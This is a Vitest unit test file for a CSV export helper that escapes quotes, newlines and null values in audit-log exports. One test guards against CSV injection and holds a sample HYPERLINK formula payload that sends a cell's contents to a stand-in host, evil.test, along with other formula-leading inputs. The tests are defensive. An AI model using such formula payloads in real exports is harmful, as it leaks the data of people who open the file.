import { describe, expect, it } from 'vitest';
import { csvCell, csvDocument } from './csv';

describe('csvCell', () => {
	it('leaves ordinary values alone', () => {
		expect(csvCell('auth.users.update')).toBe('auth.users.update');
		expect(csvCell(42)).toBe('42');
	});

	it('renders empty for null/undefined rather than the word "null"', () => {
		expect(csvCell(null)).toBe('');
		expect(csvCell(undefined)).toBe('');
	});

	it('quotes values containing a comma, quote or newline', () => {
		expect(csvCell('Acme, Advisers')).toBe('"Acme, Advisers"');
		expect(csvCell('line1\nline2')).toBe('"line1\nline2"');
	});

	it('doubles embedded quotes, so the field cannot terminate early', () => {
		// The failure this guards: audit detail carrying JSON with quotes used to break every
		// column after it, shifting the evidence into the wrong fields.
		expect(csvCell('he said "no"')).toBe('"he said ""no"""');
	});

	it('neutralises a leading formula character so the export is not executable', () => {
		// CSV injection: audit detail carries attacker-influenced text (a firm name, an email, a
		// document title someone typed), and the compliance export is opened in Excel/Sheets.
		expect(csvCell('=HYPERLINK("http://evil.test?x="&A1,"click")')).toBe(
			'"\'=HYPERLINK(""http://evil.test?x=""&A1,""click"")"'
		);
		expect(csvCell('+1234')).toBe("'+1234");
		expect(csvCell('-1+2')).toBe("'-1+2");
		expect(csvCell('@SUM(A1:A9)')).toBe("'@SUM(A1:A9)");
		expect(csvCell('\t=1+1')).toBe("'\t=1+1");
	});

	it('leaves an interior = or + alone — only the leading character starts a formula', () => {
		expect(csvCell('slug=value')).toBe('slug=value');
		expect(csvCell('a+b')).toBe('a+b');
	});

	it('neutralises a formula inside a serialised detail object too', () => {
		// JSON.stringify puts a quote first, so the object form is already safe — pin it, because
		// switching to a bare-value serialisation would silently reopen the hole.
		expect(csvCell({ note: '=1+1' }).startsWith('"{')).toBe(true);
	});

	it('serialises an audit detail object as JSON in a single quoted field', () => {
		const cell = csvCell({ changed: { enabled: { old: true, new: false } } });
		expect(cell.startsWith('"')).toBe(true);
		expect(cell.endsWith('"')).toBe(true);
		// Every quote from the JSON is doubled, so the field survives a round trip.
		expect(cell.slice(1, -1).replaceAll('""', '"')).toBe(
			'{"changed":{"enabled":{"old":true,"new":false}}}'
		);
	});
});

describe('csvDocument', () => {
	it('writes a header row then one CRLF-terminated row per record', () => {
		const csv = csvDocument(['id', 'action', 'detail'] as const, [
			{ id: 2, action: 'auth.tenants.update', detail: { alias: 'acme' } },
			{ id: 1, action: 'auth.tenants.insert', detail: null }
		]);
		const lines = csv.split('\r\n');
		expect(lines[0]).toBe('id,action,detail');
		expect(lines[1]).toBe('2,auth.tenants.update,"{""alias"":""acme""}"');
		expect(lines[2]).toBe('1,auth.tenants.insert,');
		// Trailing terminator, so appending is safe.
		expect(lines[3]).toBe('');
	});
});
